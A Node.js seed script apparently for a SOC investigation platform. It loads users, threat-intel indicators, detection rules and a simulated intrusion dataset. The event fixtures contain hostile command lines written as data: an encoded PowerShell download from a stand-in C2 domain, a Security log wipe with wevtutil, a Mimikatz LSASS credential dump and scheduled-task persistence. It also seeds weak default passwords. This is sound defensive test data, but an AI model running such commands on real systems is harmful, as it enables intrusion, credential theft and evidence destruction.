require('dotenv').config({ path: require('path').join(__dirname, '../.env') });
const bcrypt = require('bcryptjs');
const mongoose = require('mongoose');

const { connectDB, disconnectDB } = require('../src/config/database');
const User = require('../src/models/User');
const DetectionRule = require('../src/models/DetectionRule');
const Event = require('../src/models/Event');
const Alert = require('../src/models/Alert');
const Case = require('../src/models/Case');
const IOC = require('../src/models/IOC');
const Endpoint = require('../src/models/Endpoint');
const Account = require('../src/models/Account');
const Evidence = require('../src/models/Evidence');
const TimelineEntry = require('../src/models/TimelineEntry');
const AttackChain = require('../src/models/AttackChain');
const ThreatIntel = require('../src/models/ThreatIntel');
const ImpactAssessment = require('../src/models/ImpactAssessment');
const Report = require('../src/models/Report');

const iocExtractionService = require('../src/services/iocExtractionService');
const threatIntelService = require('../src/services/threatIntelService');
const profilingService = require('../src/services/profilingService');
const detectionService = require('../src/services/detectionService');
const timelineService = require('../src/services/timelineService');
const attackChainService = require('../src/services/attackChainService');
const reportService = require('../src/services/reportService');
const logger = require('../src/utils/logger');

async function seedDatabase() {
  logger.info('Starting SOC Platform Database Seeding...');
  await connectDB();

  // Clear existing collections
  await Promise.all([
    User.deleteMany({}),
    DetectionRule.deleteMany({}),
    Event.deleteMany({}),
    Alert.deleteMany({}),
    Case.deleteMany({}),
    IOC.deleteMany({}),
    Endpoint.deleteMany({}),
    Account.deleteMany({}),
    Evidence.deleteMany({}),
    TimelineEntry.deleteMany({}),
    AttackChain.deleteMany({}),
    ThreatIntel.deleteMany({}),
    ImpactAssessment.deleteMany({}),
    Report.deleteMany({})
  ]);
  logger.info('Purged previous collections successfully.');

  // 1. Seed Users (admin, analyst, viewer)
  const salt = await bcrypt.genSalt(10);
  const adminPass = await bcrypt.hash('admin123', salt);
  const analystPass = await bcrypt.hash('analyst123', salt);
  const viewerPass = await bcrypt.hash('viewer123', salt);

  const [adminUser, analystUser, viewerUser] = await User.create([
    {
      username: 'admin',
      passwordHash: adminPass,
      role: 'admin',
      fullName: 'SOC Director / Chief Admin',
      email: 'admin@soc.corp'
    },
    {
      username: 'analyst',
      passwordHash: analystPass,
      role: 'analyst',
      fullName: 'Senior Forensic Investigator',
      email: 'analyst@soc.corp'
    },
    {
      username: 'viewer',
      passwordHash: viewerPass,
      role: 'viewer',
      fullName: 'Compliance & Audit Viewer',
      email: 'viewer@soc.corp'
    }
  ]);
  logger.info('Seeded 3 users: admin/admin123, analyst/analyst123, viewer/viewer123');

  // 2. Seed Threat Intelligence Entries (12 realistic indicators)
  const threatIntelRecords = [
    {
      type: 'ip',
      value: '194.26.29.112',
      verdict: 'malicious',
      score: 98,
      source: 'AlienVault OTX',
      tags: ['CobaltStrike', 'C2', 'Russian Bulletproof Hosting']
    },
    {
      type: 'ip',
      value: '185.220.101.5',
      verdict: 'malicious',
      score: 95,
      source: 'Spamhaus DROP',
      tags: ['Tor-Exit', 'Exfiltration Endpoint', 'Botnet C2']
    },
    {
      type: 'ip',
      value: '45.142.214.88',
      verdict: 'malicious',
      score: 90,
      source: 'AbuseIPDB',
      tags: ['BruteForce', 'SSH Scanner']
    },
    {
      type: 'ip',
      value: '104.244.76.12',
      verdict: 'suspicious',
      score: 65,
      source: 'GreyNoise',
      tags: ['VPN Provider', 'Scanner']
    },
    {
      type: 'domain',
      value: 'evil-c2-tunnel.ru',
      verdict: 'malicious',
      score: 99,
      source: 'Mandiant Threat Intelligence',
      tags: ['APT29', 'Domain-Generation-Algorithm', 'C2']
    },
    {
      type: 'domain',
      value: 'auth-secure-verify.com',
      verdict: 'malicious',
      score: 92,
      source: 'PhishTank',
      tags: ['Credential Harvesting', 'Typosquatting']
    },
    {
      type: 'domain',
      value: 'update-microsoft-cdn.net',
      verdict: 'suspicious',
      score: 72,
      source: 'ThreatConnect',
      tags: ['Deceptive Domain', 'Adversary Infrastructure']
    },
    {
      type: 'hash',
      value: '275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f',
      verdict: 'malicious',
      score: 100,
      source: 'VirusTotal',
      tags: ['Mimikatz', 'HackTool:Win32/CredentialDump', 'LSASS']
    },
    {
      type: 'hash',
      value: '5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8',
      verdict: 'malicious',
      score: 98,
      source: 'VirusTotal',
      tags: ['CobaltStrike Beacon', 'Trojan.Downloader']
    },
    {
      type: 'url',
      value: 'http://evil-c2-tunnel.ru/stage2.bin',
      verdict: 'malicious',
      score: 99,
      source: 'URLhaus',
      tags: ['Payload Dropper', 'Stager']
    },
    {
      type: 'ip',
      value: '8.8.8.8',
      verdict: 'benign',
      score: 0,
      source: 'Google Public DNS',
      tags: ['Resolver', 'Legitimate']
    },
    {
      type: 'domain',
      value: 'microsoft.com',
      verdict: 'benign',
      score: 0,
      source: 'Official Vendor',
      tags: ['Operating System', 'Trusted']
    }
  ];
  await ThreatIntel.insertMany(threatIntelRecords);
  logger.info(`Seeded ${threatIntelRecords.length} Threat Intelligence feed entries.`);

  // 3. Seed Realistic Detection Rules (7 rules)
  const rules = await DetectionRule.insertMany([
    {
      name: 'Multiple Failed Logins / Password Spraying',
      description: 'Detects 5 or more failed authentication attempts from a single source or targeting a single account within 5 minutes.',
      severity: 'high',
      enabled: true,
      condition: {
        eventType: 'authentication',
        action: 'login',
        status: 'failed',
        threshold: 4,
        windowSeconds: 300,
        patternType: 'threshold'
      },
      mitreTechniqueId: 'T1110',
      tags: ['CredentialAccess', 'BruteForce', 'Authentication']
    },
    {
      name: 'Successful Logon After Multiple Failures',
      description: 'Detects a successful authentication immediately following failed login attempts, indicating brute-force or credential guessing compromise.',
      severity: 'critical',
      enabled: true,
      condition: {
        eventType: 'authentication',
        threshold: 1,
        windowSeconds: 600,
        patternType: 'failed_then_success_login'
      },
      mitreTechniqueId: 'T1078',
      tags: ['InitialAccess', 'CredentialAccess', 'ValidAccounts']
    },
    {
      name: 'Suspicious Encoded PowerShell Execution',
      description: 'Identifies PowerShell command lines invoking hidden execution flags, download strings, or base64 encoded scripts.',
      severity: 'high',
      enabled: true,
      condition: {
        eventType: 'process',
        action: 'execute',
        threshold: 1,
        windowSeconds: 300,
        patternType: 'threshold'
      },
      mitreTechniqueId: 'T1059.001',
      tags: ['Execution', 'PowerShell', 'LivingOffTheLand']
    },
    {
      name: 'Outbound Network Connection to Known C2 Infrastructure',
      description: 'Monitors external network sessions routing to flagged threat intelligence nodes or uncommon destination ports.',
      severity: 'critical',
      enabled: true,
      condition: {
        eventType: 'network',
        action: 'connect',
        threshold: 1,
        windowSeconds: 600,
        patternType: 'threshold'
      },
      mitreTechniqueId: 'T1071',
      tags: ['CommandAndControl', 'Exfiltration', 'Network']
    },
    {
      name: 'Lateral Movement via Remote Desktop (RDP) or SMB',
      description: 'Detects anomalous internal workstation-to-domain controller remote sessions.',
      severity: 'high',
      enabled: true,
      condition: {
        eventType: 'network',
        action: 'connect',
        threshold: 1,
        windowSeconds: 300,
        patternType: 'threshold'
      },
      mitreTechniqueId: 'T1021.001',
      tags: ['LateralMovement', 'RDP', 'Internal']
    },
    {
      name: 'Mass File Creation / Staging for Exfiltration',
      description: 'Identifies rapid batch archiving or mass creation of compressed archive bundles on servers.',
      severity: 'medium',
      enabled: true,
      condition: {
        eventType: 'file',
        action: 'create',
        threshold: 3,
        windowSeconds: 300,
        patternType: 'threshold'
      },
      mitreTechniqueId: 'T1560',
      tags: ['Collection', 'Staging', 'Archive']
    },
    {
      name: 'LSASS Memory Dumping / Credential Theft Tool',
      description: 'Detects access to Local Security Authority Subsystem Service (LSASS) memory structures.',
      severity: 'critical',
      enabled: true,
      condition: {
        eventType: 'process',
        action: 'execute',
        threshold: 1,
        windowSeconds: 300,
        patternType: 'threshold'
      },
      mitreTechniqueId: 'T1003',
      tags: ['CredentialAccess', 'Mimikatz', 'LSASS']
    }
  ]);
  logger.info(`Seeded ${rules.length} realistic Detection Rules.`);

  // 4. Generate & Seed Realistic Sample Intrusion Dataset (240 events)
  const now = new Date();
  const sampleEvents = [];
  const baseTime = new Date(now.getTime() - 14 * 3600 * 1000); // 14 hours ago

  const attackerIP = '194.26.29.112';
  const c2IP = '185.220.101.5';
  const stagingIP = '45.142.214.88';

  // Step 1: Pre-attack Password Spraying against jsmith, admin, svc_backup (50 failed logins)
  const targetAccounts = ['jsmith', 'admin', 'svc_backup', 'mscott', 'dwight'];
  for (let i = 0; i < 45; i++) {
    const acc = targetAccounts[i % targetAccounts.length];
    const evTime = new Date(baseTime.getTime() + i * 45 * 1000); // every 45s
    sampleEvents.push({
      timestamp: evTime,
      source: 'windows',
      host: 'WS01-FIN',
      username: acc,
      sourceIP: attackerIP,
      destinationIP: '10.0.0.45',
      sourcePort: 49152 + i,
      destinationPort: 445,
      eventType: 'authentication',
      action: 'login',
      status: 'failed',
      severity: 'high',
      techniqueId: 'T1110',
      description: `An account failed to log on. Target User: ${acc} from ${attackerIP}. Reason: Unknown user name or bad password. (EventID 4625)`,
      rawFile: 'security_eventlog_2026.csv',
      raw: { LogonType: 3, SubStatus: '0xC000006A', WorkstationName: 'WS01-FIN', ProcessName: 'C:\\Windows\\System32\\lsass.exe' },
      tags: ['T1110', 'bruteforce', 'windows']
    });
  }

  // Step 2: Successful Compromise of jsmith from attacker IP
  const breachTime = new Date(baseTime.getTime() + 48 * 60 * 1000);
  sampleEvents.push({
    timestamp: breachTime,
    source: 'windows',
    host: 'WS01-FIN',
    username: 'jsmith',
    sourceIP: attackerIP,
    destinationIP: '10.0.0.45',
    sourcePort: 51234,
    destinationPort: 445,
    eventType: 'authentication',
    action: 'login',
    status: 'success',
    severity: 'critical',
    techniqueId: 'T1078',
    description: `An account was successfully logged on. User: jsmith from ${attackerIP}. Elevated LogonType 3 via SMB. (EventID 4624)`,
    rawFile: 'security_eventlog_2026.csv',
    raw: { LogonType: 3, AuthenticationPackage: 'NTLM V2', Workstation: 'WS01-FIN' },
    tags: ['T1078', 'initial-access', 'smb-logon']
  });

  // Step 3: Execution - Malicious PowerShell Stager
  const execTime = new Date(breachTime.getTime() + 4 * 60 * 1000);
  sampleEvents.push({
    timestamp: execTime,
    source: 'edr',
    host: 'WS01-FIN',
    username: 'jsmith',
    sourceIP: '10.0.0.45',
    destinationIP: '185.220.101.5',
    sourcePort: 50120,
    destinationPort: 443,
    eventType: 'process',
    action: 'execute',
    status: 'success',
    severity: 'critical',
    techniqueId: 'T1059.001',
    description: 'Suspicious PowerShell execution: powershell.exe -NoP -NonI -W Hidden -Enc JABjAGwAaQBlAG4AdAAg... -Uri http://evil-c2-tunnel.ru/stage2.bin (EventID 4688)',
    rawFile: 'sysmon_logs.json',
    raw: {
      ParentProcess: 'cmd.exe',
      CommandLine: 'powershell.exe -NoP -NonI -W Hidden -Enc JABjAGwAaQ... DownloadString("http://evil-c2-tunnel.ru/stage2.bin")',
      ProcessId: 4892,
      Hash: '5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8'
    },
    tags: ['T1059.001', 'powershell', 'malware-stager']
  });

  // Step 4: Defense Evasion & Anti-Forensics
  const evadeTime = new Date(execTime.getTime() + 10 * 60 * 1000);
  sampleEvents.push({
    timestamp: evadeTime,
    source: 'windows',
    host: 'WS01-FIN',
    username: 'jsmith',
    sourceIP: '10.0.0.45',
    eventType: 'process',
    action: 'execute',
    status: 'success',
    severity: 'high',
    techniqueId: 'T1070',
    description: 'Security audit log cleared on host WS01-FIN: wevtutil cl Security (EventID 1102)',
    rawFile: 'security_eventlog_2026.csv',
    raw: { EventID: 1102, Channel: 'Security', User: 'jsmith' },
    tags: ['T1070', 'log-cleared', 'defense-evasion']
  });

  // Step 5: Credential Dumping via Mimikatz (T1003)
  const credTime = new Date(evadeTime.getTime() + 8 * 60 * 1000);
  sampleEvents.push({
    timestamp: credTime,
    source: 'edr',
    host: 'WS01-FIN',
    username: 'SYSTEM',
    sourceIP: '10.0.0.45',
    eventType: 'process',
    action: 'execute',
    status: 'success',
    severity: 'critical',
    techniqueId: 'T1003',
    description: 'Adversary accessed LSASS process memory: mimikatz.exe sekurlsa::logonpasswords full dump (Hash: 275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f)',
    rawFile: 'edr_alerts.json',
    raw: {
      GrantedAccess: '0x1010',
      SourceImage: 'C:\\Users\\Public\\mimikatz.exe',
      TargetImage: 'C:\\Windows\\System32\\lsass.exe'
    },
    tags: ['T1003', 'mimikatz', 'credential-dump']
  });

  // Step 6: Internal Discovery & Port Scan
  const discTime = new Date(credTime.getTime() + 15 * 60 * 1000);
  const discoveryTargets = ['10.0.0.1', '10.0.0.2', '10.0.0.10', '10.0.0.15'];
  for (let i = 0; i < 20; i++) {
    sampleEvents.push({
      timestamp: new Date(discTime.getTime() + i * 20 * 1000),
      source: 'network',
      host: 'WS01-FIN',
      username: 'jsmith',
      sourceIP: '10.0.0.45',
      destinationIP: discoveryTargets[i % discoveryTargets.length],
      sourcePort: 54000 + i,
      destinationPort: [3389, 445, 88, 135][i % 4],
      eventType: 'network',
      action: 'connect',
      status: 'success',
      severity: 'medium',
      techniqueId: 'T1046',
      description: `Internal network port probe from WS01-FIN to ${discoveryTargets[i % discoveryTargets.length]} on port ${[3389, 445, 88, 135][i % 4]}`,
      rawFile: 'firewall_traffic.log',
      raw: { proto: 'tcp', bytes_sent: 128, bytes_recv: 64 },
      tags: ['T1046', 'network-scan', 'discovery']
    });
  }

  // Step 7: Lateral Movement to Domain Controller DC01-ROOT via RDP using compromised svc_backup
  const latTime = new Date(discTime.getTime() + 25 * 60 * 1000);
  sampleEvents.push({
    timestamp: latTime,
    source: 'windows',
    host: 'DC01-ROOT',
    username: 'svc_backup',
    sourceIP: '10.0.0.45',
    destinationIP: '10.0.0.1',
    sourcePort: 58921,
    destinationPort: 3389,
    eventType: 'network',
    action: 'connect',
    status: 'success',
    severity: 'critical',
    techniqueId: 'T1021.001',
    description: 'Inbound Remote Desktop Protocol session established to DC01-ROOT from internal host WS01-FIN using Domain Admin credentials (svc_backup).',
    rawFile: 'security_eventlog_2026.csv',
    raw: { EventID: 4624, LogonType: 10, TargetDomain: 'CORP.LOCAL' },
    tags: ['T1021.001', 'lateral-movement', 'rdp']
  });

  // Step 8: Persistence on DC01-ROOT - Scheduled Task Creation
  const persTime = new Date(latTime.getTime() + 12 * 60 * 1000);
  sampleEvents.push({
    timestamp: persTime,
    source: 'windows',
    host: 'DC01-ROOT',
    username: 'svc_backup',
    sourceIP: '10.0.0.1',
    eventType: 'process',
    action: 'execute',
    status: 'success',
    severity: 'high',
    techniqueId: 'T1053',
    description: 'New scheduled task registered: schtasks.exe /create /tn "SystemHealthMonitor" /tr "C:\\Windows\\Temp\\svc_agent.exe" /sc onlogon',
    rawFile: 'security_eventlog_2026.csv',
    raw: { TaskName: '\\SystemHealthMonitor', EventID: 4698 },
    tags: ['T1053', 'persistence', 'scheduled-task']
  });

  // Step 9: Collection - Mass Archiving of Financial Records
  const collTime = new Date(persTime.getTime() + 20 * 60 * 1000);
  for (let i = 0; i < 6; i++) {
    sampleEvents.push({
      timestamp: new Date(collTime.getTime() + i * 30 * 1000),
      source: 'application',
      host: 'DC01-ROOT',
      username: 'svc_backup',
      sourceIP: '10.0.0.1',
      eventType: 'file',
      action: 'create',
      status: 'success',
      severity: 'medium',
      techniqueId: 'T1560',
      description: `Archive file generated: C:\\ProgramData\\Backup\\FIN_EXPORT_PART0${i + 1}.zip`,
      rawFile: 'file_integrity.log',
      raw: { FileSize: '48.5MB', Hash: 'd41d8cd98f00b204e9800998ecf8427e' },
      tags: ['T1560', 'collection', 'archive']
    });
  }

  // Step 10: Exfiltration to Foreign C2 IP over HTTPS
  const exfilTime = new Date(collTime.getTime() + 15 * 60 * 1000);
  for (let i = 0; i < 8; i++) {
    sampleEvents.push({
      timestamp: new Date(exfilTime.getTime() + i * 40 * 1000),
      source: 'network',
      host: 'DC01-ROOT',
      username: 'svc_backup',
      sourceIP: '10.0.0.1',
      destinationIP: c2IP,
      sourcePort: 61000 + i,
      destinationPort: 443,
      eventType: 'network',
      action: 'connect',
      status: 'success',
      severity: 'critical',
      techniqueId: 'T1041',
      description: `Sustained outbound encrypted session to malicious C2 server ${c2IP} on port 443 (Domain: evil-c2-tunnel.ru). Outbound data volume: 184MB.`,
      rawFile: 'firewall_traffic.log',
      raw: { bytes_sent: 184000000, bytes_recv: 1040, proto: 'tcp' },
      tags: ['T1041', 'exfiltration', 'c2']
    });
  }

  // Fill in background noise events (normal enterprise baseline) to reach ~250 events
  const normalUsers = ['SYSTEM', 'dwight', 'mscott', 'pam', 'jim'];
  const normalHosts = ['WS01-FIN', 'WS02-HR', 'WS03-DEV', 'DC01-ROOT', 'SRV-SQL01'];
  for (let i = 0; i < 140; i++) {
    const timeOffset = Math.floor(Math.random() * 12 * 3600 * 1000);
    const evTime = new Date(baseTime.getTime() + timeOffset);
    const host = normalHosts[i % normalHosts.length];
    const user = normalUsers[i % normalUsers.length];

    sampleEvents.push({
      timestamp: evTime,
      source: ['windows', 'dns', 'application', 'network'][i % 4],
      host,
      username: user,
      sourceIP: `10.0.0.${(i % 50) + 10}`,
      destinationIP: `10.0.0.${(i % 5) + 1}`,
      sourcePort: 49152 + (i * 7) % 10000,
      destinationPort: [80, 443, 53, 88, 389][i % 5],
      eventType: ['authentication', 'dns', 'process', 'network'][i % 4],
      action: ['login', 'connect', 'execute'][i % 3],
      status: 'success',
      severity: 'low',
      techniqueId: '',
      description: `Routine enterprise activity on ${host} by ${user} (Kerberos/LDAP/DNS baseline ticket validation)`,
      rawFile: 'baseline_telemetry.csv',
      raw: { status: 'OK', code: 200 },
      tags: ['baseline', 'normal']
    });
  }

  // Sort events chronologically
  sampleEvents.sort((a, b) => new Date(a.timestamp) - new Date(b.timestamp));
  const insertedEvents = await Event.insertMany(sampleEvents);
  logger.info(`Inserted ${insertedEvents.length} normalized Common Event Model records.`);

  // 5. Run Post-Processing Pipeline
  // A. Extract IOCs
  const iocsExtracted = await iocExtractionService.extractAndStoreIOCs(insertedEvents);
  logger.info(`Extracted ${iocsExtracted} IOCs from event streams.`);

  // B. Enrich against Threat Intelligence
  const allIOCs = await IOC.find();
  await threatIntelService.enrichIOCs(allIOCs);
  logger.info(`Enriched ${allIOCs.length} IOCs against seeded Threat Intelligence feeds.`);

  // C. Profile Endpoints and Accounts
  await profilingService.updateProfilesFromEvents(insertedEvents);
  logger.info('Updated Endpoint and Account profiles and risk scores.');

  // D. Run Detection Engine to produce Alerts
  const generatedAlerts = await detectionService.runDetectionEngine(insertedEvents);
  logger.info(`Detection Engine triggered ${generatedAlerts.length} alerts from ingested security events.`);

  // 6. Create Comprehensive Demo Case (CASE-2026-0001)
  const primaryAlert = generatedAlerts.find(a => a.severity === 'critical') || generatedAlerts[0];
  if (primaryAlert) {
    // Find all compromised assets
    const affectedEndpoints = await Endpoint.find({ hostname: { $in: ['WS01-FIN', 'DC01-ROOT'] } });
    const affectedAccounts = await Account.find({ username: { $in: ['jsmith', 'svc_backup'] } });
    const maliciousIOCs = await IOC.find({
      value: { $in: [attackerIP, c2IP, 'evil-c2-tunnel.ru', '275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f'] }
    });

    const demoCase = await Case.create({
      caseId: 'CASE-2026-0001',
      title: 'APT Intrusion & Credential Dumping Campaign (WS01-FIN -> DC01-ROOT)',
      description: `In-depth forensic investigation into unauthorized external access from ${attackerIP}, followed by credential extraction via Mimikatz, lateral movement over RDP to DC01-ROOT, and outbound C2 data exfiltration.`,
      priority: 'critical',
      status: 'investigating',
      phase: 'forensics',
      assignedTo: analystUser._id,
      alertId: primaryAlert._id,
      relatedAlerts: generatedAlerts.map(a => a._id),
      relatedEvents: insertedEvents.filter(e => ['high', 'critical'].includes(e.severity)).map(e => e._id),
      iocs: maliciousIOCs.map(i => i._id),
      accounts: affectedAccounts.map(a => a._id),
      endpoints: affectedEndpoints.map(e => e._id),
      review: {
        findings: 'Adversary breached perimeter via brute-forced credentials for jsmith. Deployed living-off-the-land PowerShell stagers, extracted domain admin credentials using Mimikatz, moved laterally to DC01-ROOT, and attempted data exfiltration. Containment successfully initiated.',
        notes: 'Forensic analyst validated memory artifacts and network PCAP traces. Perimeter firewall rules updated.',
        validatedFlags: { evidence: true, timeline: true, iocs: true },
        reviewedBy: analystUser._id,
        reviewedAt: new Date()
      }
    });

    // Link demo case back to primary alert
    primaryAlert.caseId = demoCase._id;
    primaryAlert.assignedTo = analystUser._id;
    primaryAlert.status = 'investigating';
    await primaryAlert.save();

    // Link IOCs to Case
    await IOC.updateMany(
      { _id: { $in: maliciousIOCs.map(i => i._id) } },
      { $set: { caseId: demoCase._id } }
    );

    // Build timeline for Case
    const caseEvents = insertedEvents.filter(e => ['high', 'critical'].includes(e.severity));
    await timelineService.buildCaseTimeline(demoCase._id, caseEvents, primaryAlert);

    // Build MITRE Attack Chain for Case
    const attackChain = await attackChainService.generateAttackChainForCase(demoCase._id, caseEvents);
    demoCase.attackChainId = attackChain._id;

    // Create Evidence Locker items
    const evidenceItems = await Evidence.insertMany([
      {
        caseId: demoCase._id,
        type: 'artifact',
        title: 'Memory Dump - WS01-FIN (LSASS process carve)',
        description: 'Volatility 3 memory image showing LSASS injected DLL and cleartext credential extraction.',
        filePath: 'uploads/evidence-ws01-lsass.dmp',
        hashType: 'SHA256',
        hashValue: '275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f',
        collectedBy: 'analyst',
        analystValidated: true
      },
      {
        caseId: demoCase._id,
        type: 'pcap',
        title: 'Network Packet Capture - Outbound C2 Traffic (185.220.101.5)',
        description: 'Wireshark PCAP trace capturing TLS handshake to evil-c2-tunnel.ru with anomalous JA3 fingerprint.',
        filePath: 'uploads/evidence-c2-traffic.pcap',
        hashType: 'SHA256',
        hashValue: '8f434346648f6b96df89dda901c5176b10a6d83961dd3c1ac88b59b2dc327aa4',
        collectedBy: 'analyst',
        analystValidated: true
      },
      {
        caseId: demoCase._id,
        type: 'log',
        title: 'PowerShell ScriptBlock Event 4104 Log Extract',
        description: 'Deobfuscated Base64 PowerShell execution string downloading stage2.bin payload.',
        filePath: 'uploads/evidence-powershell-4104.txt',
        hashType: 'MD5',
        hashValue: 'e4d909c290d0fb1ca068ffaddf22cbd0',
        collectedBy: 'analyst',
        analystValidated: true
      }
    ]);
    demoCase.evidence = evidenceItems.map(e => e._id);

    // Create Impact Assessment
    const impact = await ImpactAssessment.create({
      caseId: demoCase._id,
      affectedEndpoints: [
        { hostname: 'WS01-FIN', severity: 'critical' },
        { hostname: 'DC01-ROOT', severity: 'critical' }
      ],
      affectedAccounts: [
        { username: 'jsmith', role: 'standard', sensitivity: 'high' },
        { username: 'svc_backup', role: 'domain_admin', sensitivity: 'critical' }
      ],
      affectedFiles: [
        { path: 'C:\\ProgramData\\Backup\\FIN_EXPORT_PART01.zip', sensitivity: 'confidential' },
        { path: 'C:\\Windows\\System32\\config\\SAM', sensitivity: 'restricted' }
      ],
      dataExposed: true,
      malwareDetected: 'Cobalt Strike Beacon + Mimikatz LSASS injector',
      businessImpact: 'Workstations isolated. Domain controller password reset required. Data exposure estimated at 180MB financial archive.',
      autoDetectedIndicators: [
        'Brute-force credential access detected from 194.26.29.112',
        'LSASS memory access observed via Sysmon Event 10',
        'Lateral movement confirmed over TCP/3389 (RDP)',
        'Anomalous outbound encrypted channel to 185.220.101.5'
      ],
      analystNotes: 'Endpoints quarantined from internal subnet. Krbtgt password rotated twice. Forensics ongoing.',
      confidence: 95,
      assessedBy: analystUser._id
    });
    demoCase.impactAssessmentId = impact._id;
    await demoCase.save();

    // Generate Incident Report
    await reportService.generateReportForCase(demoCase._id, analystUser._id);
    logger.info(`Generated initial Incident Report for demo case ${demoCase.caseId}`);
  }

  logger.info('SOC Platform Seeding completed successfully!');
  await disconnectDB();
}

if (require.main === module) {
  seedDatabase()
    .then(() => process.exit(0))
    .catch(err => {
      logger.error(`Fatal error in seeding: ${err.message}`, { stack: err.stack });
      process.exit(1);
    });
}

module.exports = seedDatabase;
